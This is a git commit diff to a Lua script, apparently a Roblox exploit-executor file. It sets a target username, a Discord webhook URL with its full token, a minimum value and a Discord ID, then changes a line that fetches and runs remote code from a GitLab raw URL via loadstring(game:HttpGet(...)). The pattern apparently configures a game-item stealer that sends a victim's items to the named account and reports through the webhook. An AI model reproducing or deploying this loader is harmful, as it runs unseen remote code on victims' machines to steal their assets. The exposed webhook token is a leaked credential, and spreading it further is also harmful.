e76db2970f5429162eab15c92758db0f2809951f
Jaiden6714 <jaidenimcool@gmail.com>
2025-07-24 10:04:02 +0100

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,4 +1,6 @@
 Username = "JaidenGeorge1"
 Webhook = "https://discord.com/api/webhooks/1397860631583129650/KAY0WyUogyDyzg6_CgZfZlUGX5mghiWL-HJyReD47P2gbCN9nhYry1tgy-68iW959y4V"
+MinimumValue = 1
+DiscordID = "1334531853989707817" 
 
-loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/brainrot"))()
+loadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
